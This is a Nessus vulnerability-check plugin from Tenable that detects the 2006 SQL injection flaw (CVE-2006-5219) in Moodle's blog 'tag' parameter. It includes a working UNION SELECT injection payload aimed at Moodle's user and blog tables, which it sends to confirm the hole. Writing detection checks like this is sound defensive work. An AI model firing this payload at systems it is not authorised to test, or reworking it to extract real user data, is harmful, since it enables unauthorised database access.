#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(22527);
  script_version("$Revision: 1.18 $");
  script_cvs_date("$Date: 2016/11/18 19:03:16 $");

  script_cve_id("CVE-2006-5219");
  script_bugtraq_id(20395);
  script_osvdb_id(29573);

  script_name(english:"Moodle 'index.php' 'tag' Parameter SQL Injection");
  script_summary(english:"Checks for a SQL injection flaw in the Moodle Blog feature.");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is affected by a
SQL injection vulnerability.");
  script_set_attribute(attribute:"description", value:
"The installed version of Moodle fails to properly sanitize user-
supplied input to the 'tag' parameter of the 'blog/index.php' script
before using it in database queries. Provided the blog feature is
enabled, an unauthenticated attacker can leverage this issue to
manipulate database queries to reveal sensitive information, modify
data, and launch attacks against the underlying database.");
  script_set_attribute(attribute:"see_also", value:"http://seclists.org/fulldisclosure/2006/Oct/129");
  script_set_attribute(attribute:"see_also", value:"http://seclists.org/fulldisclosure/2006/Oct/137");
  script_set_attribute(attribute:"solution", value:"Apply the patch from CVS or restrict access to the blog feature.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:H/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2006/10/08");
  script_set_attribute(attribute:"patch_publication_date", value:"2006/10/08");
  script_set_attribute(attribute:"plugin_publication_date", value:"2006/10/10");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:moodle:moodle");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006-2016 Tenable Network Security, Inc.");

  script_dependencies("moodle_detect.nasl");
  script_require_keys("www/PHP", "installed_sw/Moodle");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("url_func.inc");
include("install_func.inc");

app = "Moodle";
get_install_count(app_name:app, exit_if_zero:TRUE);

port = get_http_port(default:80, php:TRUE);

install = get_single_install(
  app_name : app,
  port     : port
);

dir = install['path'];
install_url = build_url(port:port, qs:dir);

# Try to exploit the flaw.
username = rand();
password = unixtime();
email = rand();
exploit =
  "%27 UNION SELECT %27-1 UNION SELECT 1,1,1,1,1,1,1," + username + "," +
  password + ",1,1,1,1,1,1,1," + username + "," + password + "," + email +
  " UNION SELECT 1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1 FROM mdl_post p, "+
  "mdl_blog_tag_instance bt, mdl_user u WHERE 1=0%27,1,1,%271";

w = http_send_recv3(
  method : "GET",
  item   : dir + "/blog/index.php?tag=x" +  urlencode(str:exploit),
  port   : port,
  exit_on_fail : TRUE
);
res = strcat(w[0], w[1], '\r\n', w[2]);

# There's a problem if...
if ('<div class="audience"></div><p>' + password + '</p>' >< res)
{
  set_kb_item(name:'www/'+port+'/SQLInjection', value:TRUE);
  security_warning(port);
  exit(0);
}
else audit(AUDIT_WEB_APP_NOT_AFFECTED, app, install_url);
